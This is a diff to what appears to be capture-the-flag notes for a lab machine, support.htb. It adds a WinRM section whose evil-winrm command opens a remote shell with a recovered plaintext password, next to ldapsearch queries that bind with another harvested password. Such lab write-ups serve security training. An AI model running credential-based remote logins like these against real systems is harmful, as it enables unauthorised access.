@@ -94,6 +94,12 @@ ldapsearch -H ldap://support.htb -x -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7Ac
 ldapsearch -H ldap://support.htb -x -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "Administrator"
 ```
 
+## WinRM
+
+```bash
+evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
+```
+
 ## Decompilers
 
 - [AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy)
